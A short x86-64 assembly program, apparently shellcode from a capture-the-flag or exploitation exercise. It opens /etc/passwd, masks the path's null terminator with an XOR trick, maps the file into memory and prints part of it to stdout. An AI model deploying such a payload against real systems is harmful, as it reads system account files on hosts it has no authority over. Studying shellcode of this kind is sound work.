section     .text
global      _start 
_start:
    xor rax, rax
    mov al, 0x2
    mov rsi, 0x8000
    mov rdx, 0x0
    mov rdi, flag_path
    xor byte [rdi+14], 0x41
    syscall

    mov r8, rax
    mov rax, 0x09
    mov rbx, 0x0
    mov rcx, 0x2
    mov rdx, 0x1
    mov rdi, 0
    mov rsi, 0x1000
    mov r9, 0x0
    mov r10, 0x2
    syscall

    mov r10, rax

    mov rax, 0x1
    mov rdi, 0x1
    mov rsi, r10
    mov rdx, 0x30
    syscall

section     .data
flag_path     db  '////etc/passwdA',15  
fd_text       db  'fd opened at A'